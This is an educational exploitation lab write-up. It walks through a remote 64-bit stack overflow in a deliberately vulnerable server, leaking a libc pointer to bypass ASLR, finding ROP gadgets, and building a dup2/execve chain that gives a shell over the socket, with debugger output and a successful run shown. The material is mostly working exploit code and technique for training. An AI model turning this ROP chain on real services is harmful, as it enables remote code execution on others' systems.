# Remote Buffer overflow with ROP - DEP/ASLR/64bit

Networked server with a stack based overflow. Can be solved by using ROP
and `dup()` (.data segment only) method.


## Source

* Source directory: `~/challenges/challenge17/`
* Source files: [challenge17](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge17)

You can compile it by calling `make` in the folder `~/challenges/challenge17`


### Vulnerability

The vulnerability lies here:

```c
void handleClient (int socket) {
   long int ret = 0;
   char data[1024];

   write(socket, &ret, 32); // info leak

   bzero(data, sizeof(data));
   write(socket, "Data: ", 6);

   ret = read(socket, data, 2048); // reads up to 2048 bytes into a 1024 buffer
   printf("I've read %i bytes\n", ret);
}
```

The server first writes 32 bytes of his stack frame into the socket. 
After that, it will read up to 2048 bytes into a 1024 buffer.

Offset to SIP is again 1048. 


## Usage

Start the server in a terminal:
```
~/challenges/challenge17$ ./challenge17
Starting server on port: 5001

Client connected
I've read 5 bytes
```

```
~/challenges/challenge17$ nc localhost 5001
вL%5@ȳL%@@P@
)ȳL%L%@Data: test
^C
```


## Exploit plan

In this challenge, we will use the `dup2()` trick.

First we will duplicate the socket descriptor into the standard file input/output
file descriptors (0, 1, 2). After that we will execute `/bin/sh` by using `execve()`.

Code we will execute:
- dup2(x, 0)
- dup2(x, 1)
- dup2(x, 2)
- execve(&"/bin/sh", &0, &0)

So, what do we need:
- Client socket number (x)
- dup2() system call nr
- execve() system call nr
- pop rax gadget (syscall nr)
- pop rdi gadget (first argument)
- pop rsi gadget (second argument)
- and also: A memory address with a zero 64 bit value for execve's other arguments

A bit of internet research resolves the system call numbers:
- dup2(): 33
- execve(): 59


An additional problem is, that the binary does not contain the necessary gadgets. 
We will take the gadgets from the LIBC, but as ASLR is turned on, we need to exploit information leak first. 

The string `/bin/sh` is already stored in LIBC too. 


## Information leak

When connecting to the port, the server will immediately dump 32 bytes of
its stack:
```
~/challenges/challenge17$ nc localhost 5001 | hexdump -C
00000000  00 00 00 00 00 00 00 00  b0 72 ab a0 fc 7f 00 00  |.........r......|
00000010  35 14 40 00 00 00 00 00  a8 73 ab a0 fc 7f 00 00  |5.@......s......|
00000020  95 14 40 00 01 00 00 00  00 00 00 00 00 00 00 00  |..@.............|
00000030  00 00 00 00 10 00 00 00  02 00 ec 38 7f 00 00 01  |...........8....|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 04 00 00 00  |................|
00000050  03 00 00 00 89 13 00 00  50 14 40 00 00 00 00 00  |........P.@.....|
00000060  0a 7d d3 39 7d 7f 00 00  a8 73 ab a0 fc 7f 00 00  |.}.9}....s......|
00000070  e9 75 ab a0 01 00 00 00  7f 13 40 00 00 00 00 00  |.u........@.....|
^C
```

The first three elements:
* 0x00: 00 00 00 00 00 00 00 00: long int ret = 0
* 0x08: b0 72 ab a0 fc 7f 00 00: probably SBP, 0x7ffca0ab72b0: A stack address
* 0x10: 35 14 40 00 00 00 00 00: probably SIP, 0x401435: A code address

And also a pointer into LIBC at offeset 0x60:

* 0a 7d d3 39 7d 7f 00 00: probably LIBC, 0x7f7d39d37d0a

How do we know? Lets check the memory mappings of the parent process:
```
~/challenges/challenge17$ ps axw | grep challenge17
   7924 pts/1    S+     0:00 ./challenge17
   8163 pts/4    S+     0:00 grep challenge17

~/challenges/challenge17$ cat /proc/7924/maps
...
7f7d39d11000-7f7d39d36000 r--p 00000000 00:4c 1746                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7d39d36000-7f7d39e81000 r-xp 00025000 00:4c 1746                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7d39e81000-7f7d39ecb000 r--p 00170000 00:4c 1746                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7d39ecb000-7f7d39ecc000 ---p 001ba000 00:4c 1746                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7d39ecc000-7f7d39ecf000 r--p 001ba000 00:4c 1746                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f7d39ecf000-7f7d39ed2000 rw-p 001bd000 00:4c 1746                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
...
7f7d39f0a000-7f7d39f0b000 rw-p 00000000 00:00 0 
7ffca0a98000-7ffca0ab9000 rw-p 00000000 00:00 0                          [stack]
```

So `0x7f7d39d37d0a` looks like its in the `r-x` module of libc. 


## ROP Gadgets

Lets find our rop gadgets. The binary itself does not have all of them: 

```
~/challenges/challenge17$ python3 print-gadgets.py challenge17
[*] '/root/challenges/challenge17/challenge17'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
...
Useful gadgets:
None
Gadget(0x4014ab, ['pop rdi', 'ret'], ['rdi'], 0x10)
Gadget(0x4014a9, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0x18)
None
None
```

So, lets take them all from LIBC. Lets check the bindings:

```
~/challenges/challenge17$ ldd ./challenge17
        linux-vdso.so.1 (0x00007ffe865bc000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8109d1e000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f8109eeb000)
```

And find the gadgets in the referenced libc version in `/lib64/ld-linux-x86-64.so.2`
```
~/challenges/challenge17$ python3 print-gadgets.py /lib/x86_64-linux-gnu/libc.so.6 
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loading gadgets for '/lib/x86_64-linux-gnu/libc.so.6'

Useful gadgets:
Gadget(0x3ee88, ['pop rax', 'ret'], ['rax'], 0x10)
Gadget(0x26796, ['pop rdi', 'ret'], ['rdi'], 0x10)
Gadget(0x2890f, ['pop rsi', 'ret'], ['rsi'], 0x10)
Gadget(0xcb1cd, ['pop rdx', 'ret'], ['rdx'], 0x10)
~/challenges/challenge17$ python3 print-gadgets.py /lib/x86_64-linux-gnu/libc.so.6  | grep syscall
 152875: Gadget(0x2552b, ['syscall'], [], 0x0),
 258294: Gadget(0x3f0f6, ['syscall', 'pop rbp', 'ret'], ['rbp'], 0x10),
 360666: Gadget(0x580da, ['syscall', 'ret'], [], 0x8),
 545158: Gadget(0x85186, ['syscall', 'pop rbx', 'ret'], ['rbx'], 0x10),
gadget(address=152875, details=Gadget(0x2552b, ['syscall'], [], 0x0))
```

## Data

We need two other things: 
* the string `/bin/sh`
* a 64 bit 0 value 

Lets use pwntools to find the string `/bin/sh`:
```
~/challenges/challenge17$ gdb -q 
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
[*] 2 commands could not be loaded, run `gef missing` to know why.
[+] Configuration from '/root/.gef.rc' restored
gef➤  attach 7924
...
gef➤  grep "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7f7d39e81000-0x7f7d39ecb000), permission=r--
  0x7f7d39e9b152 - 0x7f7d39e9b159  →   "/bin/sh" 
[+] In (0x7f7d39ed2000-0x7f7d39ed8000), permission=rw-
  0x7f7d39ed7f70 - 0x7f7d39ed7f77  →   "/bin/sh" 

gef➤  x/1s 0x7f7d39e9b152
0x7f7d39e9b152: "/bin/sh"
```

The 0 value we can get for example from this section at a static location: 
```
0x00000000403000 0x00000000404000 0x00000000002000 r-- /root/challenges/challenge17/challenge17
```

```
gef➤  x/32xg 0x00000000404000
0x404000:       0x0000000000403e20      0x00007f0429e70180
0x404010:       0x00007f0429e5a4c0      0x00007f0429ced5f0
0x404020 <write@got.plt>:       0x0000000000401046      0x00007f0429d84740
0x404030 <printf@got.plt>:      0x00007f0429ccdcf0      0x00007f0429d666b0
0x404040 <read@got.plt>:        0x0000000000401086      0x00007f0429cb2b60
0x404050 <listen@got.plt>:      0x00007f0429d75fa0      0x00007f0429d75e40
0x404060 <perror@got.plt>:      0x00000000004010c6      0x00007f0429d75da0
0x404070 <exit@got.plt>:        0x00000000004010e6      0x00007f0429d42470
0x404080 <socket@got.plt>:      0x00007f0429d76470      0x0000000000000000
0x404090:       0x0000000000000000      0x0000000000000000
```

So lets take the value `0x404090`.


## Client socket nr

The socket number in the argument for the function `handleClient`. Lets check it:
```
gdb-peda$ b *handleClient
Breakpoint 1 at 0x400b12
gdb-peda$ c
Continuing.
[New process 7643]
[Switching to process 7643]

 [----------------------------------registers-----------------------------------]
RAX: 0x4
RBX: 0x0
RCX: 0x7ffc0b70c840 --> 0x7ffc00000031
RDX: 0x0
RSI: 0x1
RDI: 0x4
```

First argument is in `RDI`, therefore the socket number is `4`.


## Recap

The libc pointer from the information leak is `0x7f7d39d37d0a`, while the libc address was `0x7f7d39d11000`.
Therefore, to get the base address from the pointer we need to calculate its offset: 

```
~/challenges/challenge17$ echo $(( 0x7f7d39d37d0a - 0x7f7d39d11000 ))
158986
```


Lets write down all the information we have into some python variables:

```
    libcPtr = u64(infoLeakData[0x60:0x60+8])
    libcBase = libcPtr - 158986
    null = 0x404090
    socketNo = 4

    binBash = libcBase + 1614162
    pop_rax = libcBase + 0x3ee88
    pop_rdi = libcBase + 0x26796
    pop_rsi = libcBase + 0x2890f
    syscall = libcBase + 0x580da
```


## Rop chain

We can create the ropchain like this:
```
    # dup2(4, 0)
    payload += p64 ( pop_rax ) 
    payload += p64 ( 33 )
    payload += p64 ( pop_rdi ) 
    payload += p64 ( socketNo )
    payload += p64 ( pop_rsi)
    payload += p64 ( 0 )
    payload += p64 ( syscall ) 

    # dup2(4, 1)
    payload += p64 ( pop_rax ) 
    payload += p64 ( 33 )
    payload += p64 ( pop_rdi ) 
    payload += p64 ( socketNo )
    payload += p64 ( pop_rsi )
    payload += p64 ( 1 )
    payload += p64 ( syscall ) 

    # dup2(4, 2)
    payload += p64 ( pop_rax ) 
    payload += p64 ( 33 )
    payload += p64 ( pop_rdi ) 
    payload += p64 ( socketNo )
    payload += p64 ( pop_rsi)
    payload += p64 ( 2 )
    payload += p64 ( syscall ) 

    # execve 
    payload += p64 ( pop_rdi )
    payload += p64 ( binBash )
    payload += p64 ( pop_rsi )
    payload += p64 ( null )
    payload += p64 ( pop_rax)
    payload += p64 ( 59 )
    payload += p64 ( syscall )
```


## Lets try it 

```
~/challenges/challenge17$ python3 exp-challenge17.py --offset 1048
Dont forget to start the server in the background
[+] Opening connection to localhost on port 5001: Done
--[ Send exploit
Infoleak:
00000000  00 00 00 00  00 00 00 00  d0 b2 4c 25  fc 7f 00 00  │····│····│··L%│····│
00000010  35 14 40 00  00 00 00 00  c8 b3 4c 25  fc 7f 00 00  │5·@·│····│··L%│····│
00000020  95 14 40 00  01 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
00000030  00 00 00 00  10 00 00 00  02 00 ec 80  7f 00 00 01  │····│····│····│····│
00000040  00 00 00 00  00 00 00 00  00 00 00 00  04 00 00 00  │····│····│····│····│
00000050  03 00 00 00  89 13 00 00  50 14 40 00  00 00 00 00  │····│····│P·@·│····│
00000060  0a dd c9 29  04 7f 00 00  c8 b3 4c 25  fc 7f 00 00  │···)│····│··L%│····│
00000070  19 b6 4c 25  01 00 00 00  7f 13 40 00  00 00 00 00  │··L%│····│··@·│····│
00000080
LIBC Ptr : 0x7f0429c9dd0a
LIBC Base: 0x7f0429c77000
Send Data: 
[*] Switching to interactive mode
Data: $ ls
Makefile
challenge17
challenge17.c
execve.c
exp-challenge17.py
print-gadgets.py
```


